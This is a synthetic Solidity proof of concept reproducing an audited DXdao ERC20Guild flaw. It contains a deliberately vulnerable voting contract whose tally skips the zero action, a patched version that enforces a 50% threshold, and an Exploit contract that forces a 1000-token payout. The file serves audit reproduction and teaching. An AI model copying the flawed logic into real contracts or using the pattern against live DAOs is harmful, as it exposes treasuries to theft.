// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  DXdao ERC20Guild — endProposal does not tally the zero action
    (Sigma Prime, finding 19343).
    SYNTHETIC, cheatcode-free. The loop that starts at i = 1 is the audited
    code (@> VULN). Action 0 is "no action". setConfig never requires the
    execution threshold to be at least half of total locked voting power.
    Here total locked power is 100, the threshold is 30, action 0 has 29,
    and action 1 has 30. The loop never scans index 0, so the scanned total
    is 30, off by the 29 zero-action votes (full total 59). Action 1 still
    clears the 30 bar and beats action 0, so the guild pays 1000 GUILD.
    A 50-vote majority bar, which is what the report says setConfig must
    enforce, leaves the winner at 0 and pays nothing. The deciding total
    30 is short of that bar by 20, and that gap flips the payout. */

contract MockToken {
    string public name;
    string public symbol;
    uint8 public immutable decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Sink {}

contract ERC20Guild {
    struct Proposal {
        uint256[] totalVotes;
        uint256 endTime;
    }

    MockToken public token;
    address public payee;
    uint256 public totalLocked = 100;
    uint256 public executionPercent = 30;
    uint256 public payout = 1_000 ether;
    mapping(bytes32 => Proposal) internal proposals;

    uint256 public winningAction;
    uint256 public winningVotes;
    uint256 public scannedVotes;
    uint256 public omittedZeroVotes;
    uint256 public paid;

    constructor(address _token, address _payee) {
        token = MockToken(_token);
        payee = _payee;
    }

    function getVotingPowerForProposalExecution() public view returns (uint256) {
        return (totalLocked * executionPercent) / 100;
    }

    function seed(bytes32 proposalId, uint256 zeroAction, uint256 actionOne) external {
        Proposal storage p = proposals[proposalId];
        p.totalVotes.push(zeroAction);
        p.totalVotes.push(actionOne);
        p.endTime = 0;
    }

    function endProposal(bytes32 proposalId) external {
        require(proposals[proposalId].endTime < block.timestamp, "open");
        uint256 winning = 0;
        uint256 i = 1;
        uint256 scanned = 0;
        // @> VULN: tally starts at i = 1, so the zero action is never scanned
        for (i = 1; i < proposals[proposalId].totalVotes.length; i++) {
            scanned += proposals[proposalId].totalVotes[i];
            if (
                proposals[proposalId].totalVotes[i] >= getVotingPowerForProposalExecution() &&
                proposals[proposalId].totalVotes[i] > proposals[proposalId].totalVotes[winning]
            ) winning = i;
        }
        winningAction = winning;
        winningVotes = proposals[proposalId].totalVotes[winning];
        scannedVotes = scanned;
        omittedZeroVotes = proposals[proposalId].totalVotes[0];
        if (winning != 0) {
            token.transfer(payee, payout);
            paid = payout;
        }
    }
}

contract ERC20GuildFixed {
    struct Proposal {
        uint256[] totalVotes;
        uint256 endTime;
    }

    MockToken public token;
    address public payee;
    uint256 public totalLocked = 100;
    uint256 public executionPercent;
    uint256 public payout = 1_000 ether;
    mapping(bytes32 => Proposal) internal proposals;
    uint256 public winningAction;
    uint256 public paid;

    constructor(address _token, address _payee) {
        token = MockToken(_token);
        payee = _payee;
    }

    function setConfig(uint256 percent) external {
        // FIX: endProposal assumes a zero-action majority can block every other action
        require(percent >= 50, "required assumption by endProposal default voting tally");
        executionPercent = percent;
    }

    function getVotingPowerForProposalExecution() public view returns (uint256) {
        return (totalLocked * executionPercent) / 100;
    }

    function seed(bytes32 proposalId, uint256 zeroAction, uint256 actionOne) external {
        Proposal storage p = proposals[proposalId];
        p.totalVotes.push(zeroAction);
        p.totalVotes.push(actionOne);
        p.endTime = 0;
    }

    function endProposal(bytes32 proposalId) external {
        require(proposals[proposalId].endTime < block.timestamp, "open");
        uint256 winning = 0;
        uint256 i = 1;
        for (i = 1; i < proposals[proposalId].totalVotes.length; i++) {
            if (
                proposals[proposalId].totalVotes[i] >= getVotingPowerForProposalExecution() &&
                proposals[proposalId].totalVotes[i] > proposals[proposalId].totalVotes[winning]
            ) winning = i;
        }
        winningAction = winning;
        if (winning != 0) {
            token.transfer(payee, payout);
            paid = payout;
        }
    }
}

contract Exploit {
    MockToken public token;
    Sink public sink;
    ERC20Guild public guild;
    bytes32 public constant PROPOSAL = keccak256("proposal");
    uint256 public constant ZERO_ACTION = 29;
    uint256 public constant ACTION_ONE = 30;
    uint256 public constant MAJORITY_BAR = 50;

    constructor() {
        token = new MockToken("Guild", "GUILD", 18);
        sink = new Sink();
        guild = new ERC20Guild(address(token), address(sink));
        token.mint(address(guild), guild.payout());
    }

    function run() external {
        guild.seed(PROPOSAL, ZERO_ACTION, ACTION_ONE);
        guild.endProposal(PROPOSAL);
        uint256 omitted = guild.omittedZeroVotes();
        uint256 scanned = guild.scannedVotes();
        uint256 winnerVotes = guild.winningVotes();
        require(omitted == ZERO_ACTION, "zero action");
        require(scanned + omitted == ZERO_ACTION + ACTION_ONE, "full total");
        require((ZERO_ACTION + ACTION_ONE) - scanned == ZERO_ACTION, "off by 29");
        require(guild.winningAction() == 1, "winner");
        require(MAJORITY_BAR - winnerVotes == 20, "off by 20");
        require(guild.paid() == 1_000 ether, "payout");
        require(token.balanceOf(address(sink)) == 1_000 ether, "sink");
    }
}
